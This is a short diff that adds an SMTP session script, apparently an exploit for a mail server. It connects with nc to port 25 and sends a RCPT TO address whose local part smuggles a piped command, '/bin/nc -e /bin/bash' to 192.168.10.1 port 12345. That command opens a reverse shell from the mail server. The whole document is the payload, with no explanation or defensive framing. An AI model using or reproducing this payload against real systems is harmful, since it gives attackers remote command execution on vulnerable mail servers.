@@ -1,0 +1,6 @@
+nc 192.168.11.5 25
+ehlo you
+mail from: <>
+rcpt to: <nobody+"|/bin/nc -e /bin/bash 192.168.10.1 12345"@localhost>
+data
+.
